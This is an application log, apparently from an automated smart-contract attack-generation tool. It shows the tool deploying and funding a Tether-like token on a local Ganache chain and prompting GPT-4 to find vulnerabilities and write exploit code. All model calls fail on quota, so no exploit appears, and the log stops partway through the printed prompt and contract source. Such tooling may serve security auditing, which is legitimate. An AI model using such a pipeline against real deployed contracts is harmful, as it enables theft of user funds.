2025-07-09 10:03:37,404 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:03:37,404 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:03:37,404 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:03:37,405 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:03:52,729 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:03:52,729 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:03:52,729 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:03:52,729 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:03:52,769 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-09 10:03:52,771 - api.contract - INFO - Analyzing code snippet
2025-07-09 10:03:52,776 - api.contract - INFO - Starting contract analysis for user: 3
2025-07-09 10:03:52,779 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpesvbax3_.sol
2025-07-09 10:03:52,780 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-09 10:03:52,780 - services.contract_service - INFO - Compiling contract...
2025-07-09 10:03:52,783 - solcx - INFO - Using solc version 0.4.17
2025-07-09 10:03:54,334 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:03:54,334 - openai._base_client - INFO - Retrying request to /chat/completions in 0.437698 seconds
2025-07-09 10:03:55,308 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:03:55,309 - openai._base_client - INFO - Retrying request to /chat/completions in 0.776827 seconds
2025-07-09 10:03:56,269 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:03:56,501 - services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-09 10:03:56,502 - services.contract_service - INFO - Deploying 4 contracts...
2025-07-09 10:03:56,618 - services.contract_service - INFO - Contract Ownable deployed at 0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe
2025-07-09 10:03:56,618 - services.contract_service - INFO - Setting up contract Ownable...
2025-07-09 10:03:56,651 - services.contract_service - INFO - Contract Ownable setup completed
2025-07-09 10:03:56,651 - services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-09 10:03:56,696 - services.contract_service - INFO - Contract Ownable funded
2025-07-09 10:03:56,796 - services.contract_service - INFO - Contract Pausable deployed at 0x0E696947A06550DEf604e82C26fd9E493e576337
2025-07-09 10:03:56,796 - services.contract_service - INFO - Setting up contract Pausable...
2025-07-09 10:03:56,869 - services.contract_service - INFO - Contract Pausable setup completed
2025-07-09 10:03:56,870 - services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-09 10:03:56,915 - services.contract_service - INFO - Contract Pausable funded
2025-07-09 10:03:57,007 - services.contract_service - INFO - Contract SafeMath deployed at 0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15
2025-07-09 10:03:57,008 - services.contract_service - INFO - Setting up contract SafeMath...
2025-07-09 10:03:57,016 - services.contract_service - INFO - Contract SafeMath setup completed
2025-07-09 10:03:57,016 - services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-09 10:03:57,060 - services.contract_service - INFO - Contract SafeMath funded
2025-07-09 10:03:57,995 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:03:57,996 - openai._base_client - INFO - Retrying request to /chat/completions in 0.440718 seconds
2025-07-09 10:03:59,124 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:03:59,125 - openai._base_client - INFO - Retrying request to /chat/completions in 0.872268 seconds
2025-07-09 10:04:00,190 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:00,380 - services.contract_service - INFO - Contract TetherToken deployed at 0xA94B7f0465E98609391C623d0560C5720a3f2D33
2025-07-09 10:04:00,380 - services.contract_service - INFO - Setting up contract TetherToken...
2025-07-09 10:04:01,424 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:01,425 - openai._base_client - INFO - Retrying request to /chat/completions in 0.478328 seconds
2025-07-09 10:04:02,085 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:02,085 - openai._base_client - INFO - Retrying request to /chat/completions in 0.770877 seconds
2025-07-09 10:04:03,616 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:03,930 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:03,931 - openai._base_client - INFO - Retrying request to /chat/completions in 0.477308 seconds
2025-07-09 10:04:04,590 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:04,591 - openai._base_client - INFO - Retrying request to /chat/completions in 0.942097 seconds
2025-07-09 10:04:05,739 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:06,529 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:06,529 - openai._base_client - INFO - Retrying request to /chat/completions in 0.493273 seconds
2025-07-09 10:04:07,206 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:07,207 - openai._base_client - INFO - Retrying request to /chat/completions in 0.793241 seconds
2025-07-09 10:04:08,774 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:08,886 - services.contract_service - INFO - Contract TetherToken setup completed
2025-07-09 10:04:08,886 - services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-09 10:04:08,945 - services.contract_service - INFO - Contract TetherToken funded
2025-07-09 10:04:08,945 - services.contract_service - INFO - Building contract observation...
2025-07-09 10:04:09,787 - services.contract_service - INFO - Contract observation built successfully
2025-07-09 10:04:09,787 - services.contract_service - INFO - Generating attack strategy...
2025-07-09 10:04:09,788 - services.contract_service - INFO - Running Slither analysis...
2025-07-09 10:04:10,158 - services.contract_service - WARNING - Failed to run Slither analysis: Command '['solc-select', 'versions']' returned non-zero exit status 1.
2025-07-09 10:04:10,159 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 208, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 47, in ensure_solc_version
    out = subprocess.check_output(["solc-select", "versions"], text=True)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 466, in check_output
    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 571, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['solc-select', 'versions']' returned non-zero exit status 1.

2025-07-09 10:04:10,159 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-09 10:04:10,160 - modules.attack_generator - INFO - Contract name: Ownable
2025-07-09 10:04:10,160 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-09 10:04:10,160 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-09 10:04:10,163 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-09 10:04:10,164 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-09 10:04:10,164 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-09 10:04:10,381 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:10,382 - openai._base_client - INFO - Retrying request to /chat/completions in 0.398472 seconds
2025-07-09 10:04:10,967 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:10,968 - openai._base_client - INFO - Retrying request to /chat/completions in 0.963411 seconds
2025-07-09 10:04:12,111 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:12,112 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:12,113 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:12,113 - modules.attack_generator - INFO - Contract analysis completed in 1.95 seconds
2025-07-09 10:04:12,113 - modules.attack_generator - INFO - No vulnerabilities found in the contract
2025-07-09 10:04:12,113 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-09 10:04:12,113 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-09 10:04:12,114 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-09 10:04:12,114 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-09 10:04:12,264 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:12,264 - openai._base_client - INFO - Retrying request to /chat/completions in 0.427414 seconds
2025-07-09 10:04:12,842 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:12,843 - openai._base_client - INFO - Retrying request to /chat/completions in 0.944991 seconds
2025-07-09 10:04:13,936 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:13,936 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:13,937 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:13,938 - modules.attack_generator - INFO - Attack code generation completed in 1.82 seconds
2025-07-09 10:04:13,938 - modules.attack_generator - INFO - No attack code was generated
2025-07-09 10:04:13,938 - modules.attack_generator - INFO - Total attack strategy generation completed in 3.77 seconds
2025-07-09 10:04:13,938 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-09 10:04:13,940 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpesvbax3_.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if 